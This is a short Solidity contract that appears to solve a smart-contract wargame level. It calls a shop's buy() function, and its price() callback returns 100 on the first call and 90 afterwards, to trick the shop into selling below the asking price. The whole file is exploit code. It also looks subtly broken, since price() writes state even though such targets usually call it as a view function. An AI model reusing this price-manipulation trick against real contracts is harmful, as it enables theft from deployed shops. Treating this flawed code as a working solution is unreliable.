// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Mhop {
    function buy() external;
}

contract Buyer {
    uint256 public counter;
    address public shop = 0x5Bd14F2C6bA556CFeC957e0266a79BCab854374a;

    constructor(address _shop) public {
        shop = _shop;
    }

    function shopBuy() external {
        Mhop(shop).buy();
    }

    function price() external returns (uint256 a) {
        if (counter == 0) {
            counter = 1;
            a = 100;
        } else a = 90;
    }
}
